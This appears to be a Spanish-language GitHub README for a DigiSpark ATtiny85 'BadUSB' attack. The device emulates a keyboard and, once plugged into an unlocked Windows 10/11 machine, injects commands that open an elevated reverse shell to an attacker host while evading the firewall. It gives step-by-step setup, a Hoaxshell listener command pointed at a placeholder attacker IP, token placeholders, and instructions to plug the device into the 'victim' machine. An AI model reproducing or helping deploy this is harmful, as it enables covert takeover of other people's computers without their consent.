## 📝 Descripción
> Script para **DigiSpark ATtiny85** que genera una shell inversa con permisos elevados desde una máquina Windows víctima hacia una máquina atacante, logrando evadir el firewall. 


## ⚙️ Funcionamiento
> El ataque se activa al conectar el dispositivo al puerto USB con la sesión iniciada: el DigiSpark emula un teclado e inyecta los comandos de forma automática, sin intervención del usuario, estableciendo la conexión con la máquina atacante la cual está escuchando solicitudes.


## 💻 Compatibilidad 
> Solo funciona correctamente bajo las siguientes condiciones:
- **Sistema operativo victima**: Windows 10/11
- **Sesión activa**: Escritorio desbloqueado y sesión iniciada
- **Distribucion de teclado victima**: Español Latam (Puedes configurar otra distribución siguiendo un paso adicional.)

 
## ✅ Requerimientos
1. Tener instalado Arduino IDE [Ver Arduino IDE](https://www.arduino.cc/en/software/)
2. Descargar e instalar DigiStump Board 1.6.7 a traves del Boards Manager de Arduino (Configuración)
```
   https://raw.githubusercontent.com/digistump/arduino-boards-index/refs/heads/master/package_digistump_index.json
```
3. Copiar la carpeta DigisparkKeyboard del repositorio y pegarla en:
```
C:\Users\tu_usuario\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\
```
4. Descargar e instalar la herramienta Hoaxshell de su repositorio oficial (Seguir los pasos del repositorio):
```
git clone https://github.com/t3l3machus/hoaxshell
```


## 🚀 Uso

### 1. Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
```python
python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
```
![image](https://github.com/user-attachments/assets/8da49bb0-b57a-4613-9a5a-1bc4f6299157)


### 2. Abrir Arduino y seleccionar Digispark 16.5 Board.
<img width="858" height="131" alt="imagen" src="https://github.com/user-attachments/assets/3de241e0-7181-44e2-aa3a-a96a26e3e4c1" />

### 3. Abrir Arduino y seleccionar Digispark 16.5 Board.


- IP_AND_PORT_ATTACKER: Pegar tu IP y puerto de maquina atacante
- TOKEN: Pegar el token generado por hoaxshell
- TOKEN_PART1: Pegar primera parte del token
- TOKEN_PART2: Pegar segunda parte del token
- TOKEN_PART3: Pegar tercera parte del token

![image](https://github.com/user-attachments/assets/9418035f-eaa7-4b05-ae3b-a7bd19dd68d6)



### 3) Compilar y cargar a nuestro ATTINY-85 en la misma interfaz de Arduino

### 4) Conectar el dispositivo a la máquina victima y esperamos la respuesta en nuestra máquina de atacante.

   
![image](https://github.com/user-attachments/assets/5c8ce65b-5abe-4dae-a521-7f1f90dc95a5)



